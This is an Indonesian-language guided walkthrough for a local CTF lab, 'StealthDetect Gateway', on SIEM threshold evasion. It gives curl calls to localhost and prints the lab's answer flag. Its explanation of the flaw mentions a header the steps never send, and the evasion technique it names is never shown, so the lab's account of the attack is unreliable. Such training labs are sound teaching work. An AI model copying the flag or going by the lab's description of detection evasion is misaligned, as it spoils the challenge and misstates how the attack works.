# Panduan Praktik Terbimbing: Investigasi SIEM Threshold Evasion via Slow-and-Low Scanning

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **StealthDetect Gateway** pada `http://127.0.0.1:8058`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8058/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A09-03","port":8058,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8058/`
3. Amati antarmuka operasional **StealthDetect Gateway** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (SIEM Threshold Evasion via Slow-and-Low Scanning)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s http://127.0.0.1:8058/api/probe?delay=15
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> **💡 Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `X-Client-Probe: stealth` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8058/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8058/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A09-03","flag":"ZITERA{s13m_thr3sh0ld_3v4s10n_st34lth_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{s13m_thr3sh0ld_3v4s10n_st34lth_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
